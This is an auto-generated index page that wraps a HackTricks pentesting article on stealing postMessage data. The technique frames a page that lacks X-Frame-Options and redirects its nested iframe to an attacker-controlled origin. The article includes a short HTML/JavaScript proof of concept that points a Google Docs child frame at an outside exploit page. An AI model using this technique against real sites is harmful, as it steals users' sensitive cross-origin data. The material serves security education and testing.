---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Steal postmessage modifying iframe location

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-postmessage-vulnerabilities-steal-postmessage-modifying-iframe-location` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Steal postmessage modifying iframe location](../../topics/pentesting-web/steal-postmessage-modifying-iframe-location.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-postmessage-vulnerabilities-steal-postmessage-modifying-iframe-location |
| name | Steal postmessage modifying iframe location |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md |

## Preserved Source Material

````yaml
_body: "# Steal postmessage modifying iframe location\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Changing\
  \ child iframes locations\n\nAccording to [**this writeup**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/),\
  \ if you can iframe a webpage without X-Frame-Header that contains another iframe, you can **change the location of that\
  \ child iframe**.\n\nFor example, if abc.com have efg.com as iframe and abc.com didn't have X-Frame header, I could change\
  \ the efg.com to evil.com cross origin using, **`frames.location`**.\n\nThis is specially useful in **postMessages** because\
  \ if a page is sending sensitive data using a **wildcard** like `windowRef.postmessage(\"\",\"*\")` it's possible to **change\
  \ the location of the related iframe (child or parent) to an attackers controlled location** and steal that data.\n\n```html\n\
  <html>\n  <iframe src=\"https://docs.google.com/document/ID\" />\n  <script>\n    //pseudo code\n    setTimeout(function\
  \ () {\n      exp()\n    }, 6000)\n\n    function exp() {\n      //needs to modify this every 0.1s as it's not clear when\
  \ the iframe of the iframe affected is created\n      setInterval(function () {\n        window.frames[0].frame[0][2].location\
  \ =\n          \"https://geekycat.in/exploit.html\"\n      }, 100)\n    }\n  </script>\n</html>\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md
````
